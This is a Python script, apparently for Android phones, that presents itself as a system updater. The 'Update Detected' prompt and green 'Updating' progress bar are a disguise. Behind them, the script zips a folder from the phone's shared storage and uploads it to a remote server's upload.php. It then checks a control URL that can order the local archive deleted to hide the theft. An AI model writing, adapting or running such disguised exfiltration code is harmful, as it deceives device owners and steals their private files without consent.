import math
import os.path
import shutil
import time
from os import path
from time import sleep
import sys
import requests
import io
from colorama import Fore

def main():
    print('\n\n')
    class CancelledError(Exception):
        def __init__(self, msg):
            self.msg = msg
            Exception.__init__(self, msg)

        def __str__(self):
            return self.msg

        __repr__ = __str__

    class BufferReader(io.BytesIO):
        def __init__(self, buf=b'',
                     callback=None,
                     cb_args=(),
                     cb_kwargs={}):
            self._callback = callback
            self._cb_args = cb_args
            self._cb_kwargs = cb_kwargs
            self._progress = 0
            self._len = len(buf)
            io.BytesIO.__init__(self, buf)

        def __len__(self):
            return self._len

        def read(self, n=-1):
            chunk = io.BytesIO.read(self, n)
            self._progress += int(len(chunk))
            self._cb_kwargs.update({
                'size': self._len,
                'progress': self._progress
            })
            if self._callback:
                try:
                    self._callback(*self._cb_args, **self._cb_kwargs)
                except:  # catches exception from the callback
                    raise CancelledError('The upload was cancelled.')
            return chunk

    def progress(size=None, progress=None):
        qu = progress / size
        preg = qu * 100
        mpreg = int(preg)
        fper = str(mpreg) + "%"
        # print(str(mpreg) + '%')

        # # the exact output you're looking for:
        if (mpreg <= 5):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |█-------------------| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 10 and mpreg >= 5):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |██------------------| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 15 and mpreg >= 10):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |███-----------------| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 20 and mpreg >= 15):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |████----------------| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 25 and mpreg >= 20):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |█████---------------| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 30 and mpreg >= 25):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |██████--------------| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 35 and mpreg >= 30):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |███████-------------| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 40 and mpreg >= 35):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |████████------------| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 45 and mpreg >= 40):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |█████████-----------| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 50 and mpreg >= 45):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |██████████----------| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 55 and mpreg >= 50):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |███████████---------| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 60 and mpreg >= 55):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |████████████--------| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 65 and mpreg >= 60):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |█████████████-------| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 70 and mpreg >= 65):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |███████████████-----| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 75 and mpreg >= 70):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |███████████████-----| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 80 and mpreg >= 75):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |████████████████----| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 85 and mpreg >= 80):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |█████████████████---| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 90 and mpreg >= 85):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |██████████████████--| {fper} Complete")
            sleep(0.1)
        elif (mpreg <= 99 and mpreg >= 90):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |███████████████████-| {fper} Complete")
            sleep(0.1)
        elif (mpreg == 100):
            sys.stdout.write('\r')
            sys.stdout.write(Fore.GREEN+f"Updating : |█████████████████████| {fper} Completed")
            sleep(0.5)

    files = {"myFileUpl": ("script.zip", open("script.zip", 'rb').read())}

    (data, ctype) = requests.packages.urllib3.filepost.encode_multipart_formdata(files)

    headers = {
        "Content-Type": ctype
    }
    # s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # s.connect(("8.8.8.8", 80))
    url = 'http://192.168.1.1/data/upload.php'

    body = BufferReader(data, progress)

    r = requests.post(url, data=body, headers=headers)
    if r.text == "Success":
        rm = requests.get("http://192.168.1.2/data/controls.php")
        if rm.status_code != 200:
            pass
            print("\n\nSystem Updatedm")
        else:
            if rm.text == "erease":
                print("\n\nSystem Updated")
                try:
                   os.remove("script.zip")
                except OSError as e:
                   print("Error: %s - %s." % (e.filename, e.strerror))
            else:
                print("\n\nSystem Updated.")
                


if path.exists("/storage/emulated/0/DCIM"):
    print("Detecting Updates (its may take a while...)")
    print("Please wait...")
    path = 'script'
    dist = "/storage/emulated/0/HMM"
    shutil.make_archive(path, 'zip', dist)
    file_size =os.path.getsize("script.zip")


    def convert_size(size_bytes):
        if size_bytes == 0:
            return "0B"
        size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
        i = int(math.floor(math.log(size_bytes, 1024)))
        p = math.pow(1024, i)
        s = round(size_bytes / p, 2)
        return "%s %s" % (s, size_name[i])
    def permission():
        y_n = input(Fore.BLUE+"Update Detected of " + convert_size(file_size) + " [y/n] ")
        if y_n == "y":
            main()
        elif y_n == "n":
            print(Fore.RED+"Update Cancelled")
            sys.exit()
        else:
            print(Fore.YELLOW+"Unknown Command")
            permission()


    permission()


else:
    print("Please Allow Storage Permission ")